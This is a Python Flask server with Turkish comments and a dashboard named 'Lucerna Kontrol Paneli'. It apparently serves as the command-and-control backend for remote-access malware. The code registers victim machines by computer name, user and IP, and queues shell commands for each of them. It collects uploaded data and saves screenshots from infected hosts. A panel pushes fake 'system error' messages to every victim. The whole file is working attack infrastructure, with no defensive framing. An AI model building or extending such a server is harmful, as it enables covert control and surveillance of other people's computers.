from flask import Flask, request, jsonify, send_file, render_template_string
import json
import os
from datetime import datetime
from threading import Lock
import logging

app = Flask(__name__)

DATA_DIR = "data"
os.makedirs(DATA_DIR, exist_ok=True)

clients = {}
pending_commands = {}
client_lock = Lock()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# YENI: Lucerna panel HTML kodu
LUCERNA_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lucerna Kontrol Paneli</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #0f172a;
            color: #e2e8f0;
            padding: 20px;
            min-height: 100vh;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
        }

        header {
            text-align: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid #334155;
        }

        h1 {
            color: #60a5fa;
            font-size: 2.5rem;
            margin-bottom: 10px;
        }

        .subtitle {
            color: #94a3b8;
            font-size: 1.1rem;
        }

        .stats-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: #1e293b;
            padding: 15px 20px;
            border-radius: 10px;
            margin-bottom: 25px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
        }

        .stats-button {
            background: #3b82f6;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .stats-button:hover {
            background: #2563eb;
            transform: translateY(-2px);
        }

        .log-count {
            background: #10b981;
            color: white;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.9rem;
            font-weight: bold;
        }

        .logs-container {
            background: #1e293b;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 30px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
            display: none;
        }

        .logs-container.active {
            display: block;
        }

        .log-item {
            background: #0f172a;
            border-left: 4px solid #3b82f6;
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 8px;
            transition: all 0.3s ease;
        }

        .log-item:hover {
            transform: translateX(5px);
            background: #1e293b;
        }

        .log-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }

        .log-computer {
            color: #60a5fa;
            font-weight: bold;
            font-size: 1.1rem;
        }

        .log-user {
            color: #94a3b8;
        }

        .log-time {
            color: #10b981;
            font-size: 0.9rem;
        }

        .log-details {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
            margin-top: 10px;
            padding-top: 10px;
            border-top: 1px solid #334155;
        }

        .log-detail-item {
            display: flex;
            flex-direction: column;
        }

        .detail-label {
            color: #94a3b8;
            font-size: 0.8rem;
            margin-bottom: 2px;
        }

        .detail-value {
            color: #e2e8f0;
            font-weight: 500;
        }

        .os-badge {
            display: inline-block;
            background: #8b5cf6;
            color: white;
            padding: 3px 10px;
            border-radius: 4px;
            font-size: 0.8rem;
            margin-left: 10px;
        }

        .status-online {
            color: #10b981;
            font-weight: bold;
        }

        .command-section {
            background: #1e293b;
            border-radius: 10px;
            padding: 25px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
        }

        .command-section h2 {
            color: #60a5fa;
            margin-bottom: 20px;
            text-align: center;
        }

        .command-input {
            width: 100%;
            background: #0f172a;
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 15px;
            border-radius: 8px;
            font-size: 1rem;
            margin-bottom: 15px;
            resize: vertical;
            min-height: 100px;
            font-family: monospace;
        }

        .command-input::placeholder {
            color: #64748b;
        }

        .command-button {
            background: #ef4444;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
        }

        .command-button:hover {
            background: #dc2626;
            transform: translateY(-2px);
        }

        .new-badge {
            background: #10b981;
            color: white;
            padding: 3px 10px;
            border-radius: 4px;
            font-size: 0.8rem;
            font-weight: bold;
            margin-right: 10px;
        }

        .empty-logs {
            text-align: center;
            color: #64748b;
            padding: 40px;
            font-style: italic;
        }

        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #10b981;
            color: white;
            padding: 15px 25px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
            z-index: 1000;
            transform: translateX(120%);
            transition: transform 0.3s ease;
        }

        .notification.show {
            transform: translateX(0);
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>Lucerna Kontrol Paneli</h1>
            <p class="subtitle">Sistem İzleme ve Yönetim Paneli</p>
        </header>

        <div class="stats-bar">
            <div>
                <button class="stats-button" onclick="toggleLogs()">
                    📊 Aktif Loglar
                    <span class="log-count" id="logCount">0</span>
                </button>
            </div>
            <div style="color: #94a3b8;">
                Son Güncelleme: <span id="lastUpdate">--:--:--</span>
            </div>
        </div>

        <div class="logs-container" id="logsContainer">
            <div class="empty-logs" id="emptyLogs">Henüz log bulunmuyor...</div>
            <div id="logsList"></div>
        </div>

        <div class="command-section">
            <h2>Komut Gönder</h2>
            <textarea 
                class="command-input" 
                id="commandInput" 
                placeholder="Hedef bilgisayarda görüntülenecek mesajı buraya yazın...&#10;Örnek: Sistem hatası tespit edildi! Lütfen yöneticinizle iletişime geçin."></textarea>
            <button class="command-button" onclick="sendCommand()">
                ⚡ Hata Mesajı Gönder
            </button>
        </div>
    </div>

    <div class="notification" id="notification"></div>

    <script>
        let logs = [];
        let logsVisible = false;

        function loadLogsFromAPI() {
            fetch('/api/clients')
                .then(response => response.json())
                .then(data => {
                    logs = [];
                    for (const [clientId, clientData] of Object.entries(data)) {
                        logs.push({
                            id: clientId,
                            computer: clientData.get('computer_name', 'Bilinmiyor'),
                            user: clientData.get('user', 'Bilinmiyor'),
                            os: clientData.get('os', 'Windows 11'),
                            lastSeen: clientData.get('last_seen', new Date().toISOString()),
                            status: 'Çevrimiçi',
                            isNew: true
                        });
                    }
                    updateLogDisplay();
                })
                .catch(error => {
                    console.error('Log yükleme hatası:', error);
                    // Demo veriler yükle
                    loadDemoLogs();
                });
        }

        function loadDemoLogs() {
            const now = new Date();
            logs = [
                {
                    id: 1,
                    computer: "DESKTOP-DQEPIUR",
                    user: "thomas",
                    os: "Windows 11 Pro",
                    lastSeen: new Date(now.getTime() - 2 * 60000).toISOString(),
                    status: "Çevrimiçi",
                    isNew: true
                }
            ];
            updateLogDisplay();
        }

        function updateLogDisplay() {
            const logsList = document.getElementById('logsList');
            const emptyLogs = document.getElementById('emptyLogs');
            const logCount = document.getElementById('logCount');
            
            logsList.innerHTML = '';
            
            if (logs.length === 0) {
                emptyLogs.style.display = 'block';
                logCount.textContent = '0';
            } else {
                emptyLogs.style.display = 'none';
                logCount.textContent = logs.length;
                
                logs.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
                
                logs.forEach(log => {
                    const logElement = document.createElement('div');
                    logElement.className = 'log-item';
                    
                    const lastSeenDate = new Date(log.lastSeen);
                    const now = new Date();
                    const diffMinutes = Math.floor((now - lastSeenDate) / 60000);
                    
                    let timeText;
                    if (diffMinutes < 1) {
                        timeText = 'Az önce';
                    } else if (diffMinutes < 60) {
                        timeText = `${diffMinutes} dakika önce`;
                    } else {
                        timeText = `${Math.floor(diffMinutes / 60)} saat önce`;
                    }
                    
                    logElement.innerHTML = `
                        <div class="log-header">
                            <div>
                                ${log.isNew ? '<span class="new-badge">YENİ</span>' : ''}
                                <span class="log-computer">${log.computer}</span>
                                <span class="os-badge">${log.os}</span>
                            </div>
                            <div class="log-time">${timeText}</div>
                        </div>
                        <div class="log-user">Kullanıcı: ${log.user}</div>
                        <div class="log-details">
                            <div class="log-detail-item">
                                <span class="detail-label">Durum</span>
                                <span class="detail-value status-online">${log.status}</span>
                            </div>
                            <div class="log-detail-item">
                                <span class="detail-label">Son Görülme</span>
                                <span class="detail-value">${timeText}</span>
                            </div>
                            <div class="log-detail-item">
                                <span class="detail-label">ID</span>
                                <span class="detail-value">${log.id.substring(0, 8)}...</span>
                            </div>
                        </div>
                    `;
                    
                    logsList.appendChild(logElement);
                });
            }
            
            updateLastUpdateTime();
        }

        function toggleLogs() {
            const logsContainer = document.getElementById('logsContainer');
            logsVisible = !logsVisible;
            logsContainer.classList.toggle('active', logsVisible);
            
            if (logsVisible && logs.length === 0) {
                loadLogsFromAPI();
            }
        }

        function sendCommand() {
            const commandInput = document.getElementById('commandInput');
            const message = commandInput.value.trim();
            
            if (!message) {
                showNotification('Lütfen bir mesaj girin!', 'warning');
                return;
            }
            
            showNotification(`"${message}" mesajı gönderiliyor...`, 'success');
            
            fetch('/api/send-message', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({message: message})
            })
            .then(response => response.json())
            .then(data => {
                showNotification('Hata mesajı başarıyla gönderildi!', 'success');
                commandInput.value = '';
                loadLogsFromAPI();
                
                if (!logsVisible) {
                    toggleLogs();
                }
            })
            .catch(error => {
                console.error('Komut gönderme hatası:', error);
                showNotification('Gönderim başarısız!', 'error');
            });
        }

        function showNotification(message, type = 'success') {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.style.background = type === 'success' ? '#10b981' : '#ef4444';
            
            notification.classList.add('show');
            
            setTimeout(() => {
                notification.classList.remove('show');
            }, 3000);
        }

        function updateLastUpdateTime() {
            const now = new Date();
            const timeString = now.toLocaleTimeString('tr-TR');
            document.getElementById('lastUpdate').textContent = timeString;
        }

        document.addEventListener('DOMContentLoaded', () => {
            updateLastUpdateTime();
            
            setInterval(() => {
                updateLastUpdateTime();
                if (logsVisible) {
                    loadLogsFromAPI();
                }
            }, 30000);
            
            // Klavye kısayolları
            document.addEventListener('keydown', (e) => {
                if (e.ctrlKey && e.key === 'k') {
                    e.preventDefault();
                    document.getElementById('commandInput').focus();
                }
                
                if (e.ctrlKey && e.key === 'l') {
                    e.preventDefault();
                    toggleLogs();
                }
                
                if (e.key === 'Escape') {
                    const logsContainer = document.getElementById('logsContainer');
                    logsContainer.classList.remove('active');
                    logsVisible = false;
                }
            });
        });
    </script>
</body>
</html>
"""

# YENİ API endpoint'leri
@app.route('/api/send-message', methods=['POST'])
def api_send_message():
    """Yeni mesaj gönderme endpoint'i"""
    data = request.json
    message = data.get('message', '')
    
    # Tüm client'lara mesaj gönder
    with client_lock:
        for client_id in pending_commands:
            command_entry = {
                "id": int(datetime.now().timestamp()),
                "type": "message",
                "data": message
            }
            pending_commands[client_id].append(command_entry)
    
    logger.info(f"Mesaj gönderildi: {message}")
    return jsonify({"status": "sent", "message": message})

# DEĞIŞTI: Ana sayfa artık Lucerna paneli gösteriyor
@app.route('/')
def dashboard():
    return render_template_string(LUCERNA_HTML)

# Diğer route'lar aynı kalacak...
@app.route('/register', methods=['POST'])
def register_client():
    data = request.json
    client_id = f"{data.get('computer_name', 'UNKNOWN')}_{data.get('user', 'UNKNOWN')}_{int(datetime.now().timestamp())}"
    
    with client_lock:
        clients[client_id] = {
            **data,
            'last_seen': datetime.now().isoformat(),
            'first_seen': data.get('first_sein', datetime.now().isoformat()),
            'ip': request.remote_addr
        }
        pending_commands[client_id] = []
    
    client_file = os.path.join(DATA_DIR, f"{client_id}.json")
    with open(client_file, 'w') as f:
        json.dump(clients[client_id], f, indent=2)
    
    logger.info(f"Yeni istemci: {client_id}")
    return jsonify({"client_id": client_id, "status": "registered"})

@app.route('/data', methods=['POST'])
def receive_data():
    data = request.json
    client_id = data.get('client_id')
    
    if client_id:
        with client_lock:
            if client_id in clients:
                clients[client_id]['last_seen'] = datetime.now().isoformat()
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        data_file = os.path.join(DATA_DIR, f"{client_id}_data_{timestamp}.json")
        
        with open(data_file, 'w') as f:
            json.dump(data.get('data', {}), f, indent=2)
        
        logger.info(f"Veri alındı: {client_id}")
        return jsonify({"status": "received"})
    
    return jsonify({"error": "Invalid client"}), 400

@app.route('/cmd/<client_id>', methods=['GET'])
def get_commands(client_id):
    """İstemci için komut getir - İSTEMCİ UYUMLU VERSİYON"""
    with client_lock:
        if client_id in pending_commands and pending_commands[client_id]:
            command = pending_commands[client_id].pop(0)
            
            return jsonify({
                "command": {
                    "type": command.get("type", "shell"),
                    "data": command.get("data", "")
                }
            })
    
    return jsonify({"status": "no_command"})

@app.route('/cmd', methods=['POST'])
def send_command():
    data = request.json
    client_id = data.get('client_id')
    command = data.get('command', {})
    
    with client_lock:
        if client_id in pending_commands:
            command_entry = {
                "id": int(datetime.now().timestamp()),
                "type": command.get("type", "shell"),
                "data": command.get("data", "")
            }
            pending_commands[client_id].append(command_entry)
            
            cmd_log = os.path.join(DATA_DIR, f"commands.log")
            with open(cmd_log, 'a') as f:
                f.write(f"{datetime.now().isoformat()} | {client_id} | {command_entry}\n")
            
            logger.info(f"Komut gönderildi: {client_id}")
            return jsonify({"status": "queued", "command_id": command_entry["id"]})
    
    return jsonify({"error": "Client not found"}), 404

@app.route('/report', methods=['POST'])
def command_report():
    data = request.json
    client_id = data.get('client_id')
    result = data.get('result', {})
    
    report_file = os.path.join(DATA_DIR, f"{client_id}_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    with open(report_file, 'w') as f:
        json.dump({"client_id": client_id, "result": result}, f, indent=2)
    
    if result.get('type') == 'screenshot' and result.get('output'):
        try:
            import base64
            img_data = result['output']
            if ',' in img_data:
                img_data = img_data.split(',')[1]
            
            screenshot_dir = os.path.join(DATA_DIR, "screenshots", client_id)
            os.makedirs(screenshot_dir, exist_ok=True)
            
            filename = os.path.join(screenshot_dir, f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
            with open(filename, 'wb') as f:
                f.write(base64.b64decode(img_data))
            
            logger.info(f"Ekran görüntüsü kaydedildi: {filename}")
        except Exception as e:
            logger.error(f"Ekran görüntüsü hatası: {e}")
    
    logger.info(f"Rapor alındı: {client_id}")
    return jsonify({"status": "received"})

@app.route('/api/clients', methods=['GET'])
def api_clients():
    with client_lock:
        return jsonify(clients)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
